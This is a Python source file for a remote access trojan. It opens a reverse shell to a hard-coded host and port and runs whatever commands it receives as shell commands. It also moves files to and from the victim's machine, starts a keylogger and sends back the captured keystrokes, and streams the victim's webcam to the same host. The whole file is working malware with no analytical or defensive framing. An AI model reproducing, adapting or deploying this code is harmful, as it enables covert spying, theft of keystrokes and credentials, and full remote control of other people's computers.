import socket
import subprocess
from subprocess import PIPE
import json
import os
from keylog import KeyLogger
import threading
import cv2
import pickle
import struct

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('192.168.186.152', 1221))

def receive_command():
        data = ''
        while True:
            try:
                data = data + sc.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

def upload_file(filename):
     file = open(filename, 'rb')
     sc.send(file.read())
     file.close()

def download_file(filename):
    file = open(filename,  'wb')
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
          file.write(_file)
          try:
               _file = sc.recv(1024)
          except socket.timeout as e:
               break
    sc.settimeout(None)
    file.close()   

def  open_log():
     sc.send(KeyLogger().read_log().encode())


def log_thread():
     t = threading.Thread(target=open_log)
     t.start()
    
def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect(('192.168.186.152', 8888))
     vid = cv2.VideoCapture(0)
     while (vid.isOpened()):
          img, frame = vid.read()
          b = pickle.dumps(frame)
          message = struct.pack("Q", len(b))+b
          sock.sendall(message)

def send_byte_stream():
     t = threading.Thread(target=byte_stream)
     t.start()


def run_command():
     while True:
          command = receive_command()
          if command in ('exit', 'quit'):
               break
          elif command == 'clear':
               pass
          elif command[:3] == 'cd ':
               os.chdir(command[3:])
          elif command[:8] == 'download':
               upload_file(command[9:])
          elif command[:6] == 'upload':
               download_file(command[7:])
          elif command == 'start_logger':
               KeyLogger().start_logger()
          elif command == 'baca_data':
               log_thread()
          elif command == 'stop_logger':
               KeyLogger().stop_listener()
          elif command == 'start_cam':
               send_byte_stream()

          else:
            execute = subprocess.Popen(
                                command, 
                                shell = True,
                                stdout = PIPE,
                                stderr = PIPE,
                                stdin = PIPE
                        )
            data = execute.stdout.read() + execute.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sc.send(output.encode())

run_command()